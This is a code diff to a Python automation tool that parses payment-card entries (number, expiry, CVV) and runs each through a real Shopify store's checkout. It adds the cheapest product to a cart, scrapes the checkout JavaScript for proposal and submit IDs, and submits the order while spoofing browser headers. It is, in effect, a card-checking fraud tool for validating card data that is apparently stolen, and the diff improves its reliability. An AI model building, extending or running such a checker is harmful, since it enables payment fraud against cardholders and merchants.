@@ -35,6 +35,8 @@ extract_commit_sha = _auto.extract_commit_sha
 extract_source_token = _auto.extract_source_token
 extract_private_access_token_id = _auto.extract_private_access_token_id
 extract_actions_js_url = _auto.extract_actions_js_url
+extract_all_checkout_js_urls = _auto.extract_all_checkout_js_urls
+extract_ids_from_js = _auto.extract_ids_from_js
 extract_proposal_id = _auto.extract_proposal_id
 extract_submit_for_completion_id = _auto.extract_submit_for_completion_id
 extract_queue_token = _auto.extract_queue_token
@@ -67,6 +69,7 @@ generate_page_id = _auto.generate_page_id
 
 MIN_PRODUCT_PRICE = _auto.MIN_PRODUCT_PRICE
 MAX_PRODUCT_PRICE = _auto.MAX_PRODUCT_PRICE
+_is_valid_shopify_domain = _auto._is_valid_shopify_domain
 
 
 # ── Async TLS client ──────────────────────────────────────────────────
@@ -159,10 +162,6 @@ async def _fetch_products_page(client: AsyncTLSClient, shop_url: str, page: int 
 
 
 async def _fetch_products_from_collections(client: AsyncTLSClient, shop_url: str) -> list:
-    """
-    بديل products.json — /collections/all/products.json
-    مهم جداً: بيرجع variant IDs حقيقية.
-    """
     for path in (
         "/collections/all/products.json?sort_by=price-ascending&limit=250",
         "/collections/frontpage/products.json?sort_by=price-ascending&limit=250",
@@ -180,10 +179,6 @@ async def _fetch_products_from_collections(client: AsyncTLSClient, shop_url: str
 
 
 def _best_entry(products: list, min_price: float, max_price: float = MAX_PRODUCT_PRICE):
-    """
-    يرجع (title, product_id, handle, variant_id, price) لأرخص variant متاح.
-    بيتحقق من وجود product_id و handle و variant_id حقيقيين.
-    """
     best = None
     best_price = float("inf")
     for p in products:
@@ -222,16 +217,14 @@ _CACHE_TTL = 600
 MAX_PRODUCT_PAGES = 10
 
 
+def _now_ts() -> float:
+    import time as _t
+    return _t.time()
+
+
 async def find_cheapest_product(client: AsyncTLSClient, shop_url: str,
                                 min_price: float = MIN_PRODUCT_PRICE,
                                 max_price: float = MAX_PRODUCT_PRICE):
-    """
-    يرجع: (title, product_id, product_handle, variant_id, price)
-
-    - بيستخدم products.json أو /collections/all/products.json
-    - sitemap اتحذف لأنها مش بتجيب variant_id حقيقي
-      (الـ cart permalink محتاج variant_id حقيقي)
-    """
     import time as _t
     now = _t.time()
     cache_key = (shop_url, min_price, max_price)
@@ -244,7 +237,6 @@ async def find_cheapest_product(client: AsyncTLSClient, shop_url: str,
     all_products: list = []
     last_error: Exception = None
 
-    # ── الطريقة 1: products.json ──
     try:
         for page in range(1, MAX_PRODUCT_PAGES + 1):
             try:
@@ -261,7 +253,6 @@ async def find_cheapest_product(client: AsyncTLSClient, shop_url: str,
     except Exception as e:
         last_error = e
 
-    # ── الطريقة 2: /collections/all/products.json ──
     if not all_products:
         try:
             col_products = await _fetch_products_from_collections(client, shop_url)
@@ -272,7 +263,10 @@ async def find_cheapest_product(client: AsyncTLSClient, shop_url: str,
 
     if not all_products:
         if last_error:
-            raise Exception(f"all product-fetch methods failed: {last_error}")
+            err_txt = str(last_error)
+            err_txt = re.sub(r'\.?\s*See https?://\S+\s*first for more details\.?', '', err_txt)
+            err_txt = re.sub(r'\s+', ' ', err_txt).strip()
+            raise Exception(f"all product-fetch methods failed: {err_txt}")
         raise Exception(f"products.json returned empty list at {shop_url}")
 
     best = _best_entry(all_products, min_price, max_price)
@@ -284,11 +278,6 @@ async def find_cheapest_product(client: AsyncTLSClient, shop_url: str,
     raise Exception(
         f"no available products between ${min_price:.2f}-${max_price:.2f} at {shop_url}"
     )
-
-
-def _now_ts() -> float:
-    import time as _t
-    return _t.time()
 
 
 # ── Step 1: cart → checkout ───────────────────────────────────────────
@@ -311,7 +300,6 @@ _PAGE_HEADERS = {
 
 async def add_to_cart_and_checkout(client: AsyncTLSClient, shop_url: str,
                                    variant_id: str, product_id: str = "", product_handle: str = ""):
-    """product_id و product_handle مش مستخدمين في الـ URL — variant_id كافي."""
     cart_permalink = f"{shop_url}/cart/{variant_id}:1"
     checkout_resp  = await client.get(cart_permalink, allow_redirects=True, headers={
         **_PAGE_HEADERS,
@@ -362,17 +350,18 @@ async def fetch_actions_js(client: AsyncTLSClient, actions_url: str, shop_url: s
         "accept-language": "en-US,en;q=0.9",
         "origin": shop_url,
         "priority": "u=1",
+        "referer": shop_url + "/",
         "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
         "sec-ch-ua-mobile": "?0",
         "sec-ch-ua-platform": '"Windows"',
         "sec-fetch-dest": "script",
         "sec-fetch-mode": "cors",
         "sec-fetch-site": "same-origin",
-        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
+        "user-agent": client.user_agent,
     }
     resp = await client.get(actions_url, headers=headers)
     if resp.status_code != 200:
-        raise Exception(f"GET actions JS returned {resp.status_code}")
+        raise Exception(f"GET js returned {resp.status_code}")
     return resp.text
 
 
@@ -516,7 +505,6 @@ async def send_proposal(client: AsyncTLSClient, shop_url: str, checkout_url: str
                                   session_token, build_id, source_token),
     )
     return resp.status_code, resp.text
-
 
 # ── Step 5: Proposal 2 (email) ────────────────────────────────────────
 
@@ -978,6 +966,19 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
     result = CheckResult(card=card_entry, shop_url=shop_url,
                          site_name=site_name, currency=currency,
                          status=CheckStatus.ERROR)
+
+    # ✅ تحقق من صحة الـ domain
+    try:
+        parsed = urllib.parse.urlparse(shop_url if "://" in shop_url else f"https://{shop_url}")
+        hostname = (parsed.hostname or "").lower()
+    except Exception:
+        hostname = ""
+
+    if not hostname or not _is_valid_shopify_domain(hostname):
+        result.retryable = False
+        result.error = Exception(f"invalid shop domain: {shop_url}")
+        return result
+
     try:
         card_number, card_month, card_year, card_cvv = parse_card_entry(card_entry)
     except Exception as e:
@@ -1027,16 +1028,27 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
             result.error = Exception(f"Step 2 failed: {e}")
             return result
 
+        # ✅ Step 3: جرّب كل ملفات JS
         try:
-            actions_url = extract_actions_js_url(checkout_html, shop_url)
-            if not actions_url:
-                raise Exception("could not find actions JS URL")
-            js_body     = await fetch_actions_js(client, actions_url, shop_url)
-            proposal_id = extract_proposal_id(js_body)
-            submit_id   = extract_submit_for_completion_id(js_body)
+            js_urls = extract_all_checkout_js_urls(checkout_html, shop_url)
+            if not js_urls:
+                raise Exception("no checkout JS URLs found in HTML")
+
+            proposal_id = submit_id = poll_for_receipt_id = ""
+            for js_url in js_urls:
+                try:
+                    js_body = await fetch_actions_js(client, js_url, shop_url)
+                    pid, sid, poll = extract_ids_from_js(js_body)
+                    if pid and sid:
+                        proposal_id = pid
+                        submit_id = sid
+                        poll_for_receipt_id = poll or "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
+                        break
+                except Exception:
+                    continue
+
             if not proposal_id or not submit_id:
-                raise Exception("missing Proposal or Submit ID")
-            poll_for_receipt_id = "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
+                raise Exception(f"no Proposal/Submit IDs found in {len(js_urls)} JS files")
         except Exception as e:
             result.status = CheckStatus.ERROR
             result.retryable = True
